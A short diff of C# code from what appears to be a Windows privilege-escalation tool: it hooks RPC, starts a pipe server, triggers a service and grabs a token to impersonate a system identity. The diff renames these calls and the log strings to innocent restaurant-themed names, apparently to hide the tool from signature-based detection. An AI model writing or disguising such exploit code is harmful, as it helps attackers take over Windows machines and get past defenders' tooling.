@@ -85,9 +85,9 @@ namespace Cutexe
 
                 CutexeContext gpc = new CutexeContext(ConsoleWriter, Guid.NewGuid().ToString());
 
-                gpc.HookRPC();
+                gpc.chefsArePeeSee();
                 ConsoleWriter.WriteLine("[*] pipe server started");
-                gpc.Start();
+                gpc.OpenUpRestaraunt();
                 SumOfSquares();
                 Console.WriteLine($"SumOfSquares: ({sw.Elapsed})");
                 sw.Restart();
@@ -95,7 +95,7 @@ namespace Cutexe
                 gpuTrigger uT = new gpuTrigger(gpc);
                 try
                 {
-                    int hr = uT.Trigger();
+                    int hr = uT.GetReadyToOpen();
                 }
                 catch (Exception e)
                 {
@@ -103,7 +103,7 @@ namespace Cutexe
                 }
 
 
-                WindowsIdentity sysId = gpc.GetToken();
+                WindowsIdentity sysId = gpc.GetCustomerToken();
                 if (sysId != null)
                 {
                     ConsoleWriter.WriteLine("[*] Me : " + sysId.Name);
@@ -112,7 +112,7 @@ namespace Cutexe
                 }
                 else
                 {
-                    ConsoleWriter.WriteLine("[!] Failed to imper");
+                    ConsoleWriter.WriteLine("[!] restaurant close");
                 }
                 gpc.Restore();
                 gpc.Stop();
